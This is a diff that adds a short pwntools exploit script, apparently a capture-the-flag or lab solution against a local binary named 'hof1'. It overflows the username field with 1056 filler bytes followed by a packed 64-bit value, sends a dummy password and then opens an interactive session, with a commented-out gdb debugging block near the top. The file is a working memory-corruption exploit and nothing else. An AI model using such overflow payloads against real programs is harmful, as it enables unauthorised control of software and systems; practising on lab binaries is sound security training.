@@ -1,0 +1,14 @@
+from pwn import *
+
+p = process("./hof1")
+'''
+p = gdb.debug("./hof1", gdbscript = 
+b *main + 13
+)
+'''
+
+payload = b"A" * 1056 + p64(1)
+p.sendlineafter(b"Username: ", payload)
+p.sendlineafter(b"Password: ", b"B" * 8)
+
+p.interactive()
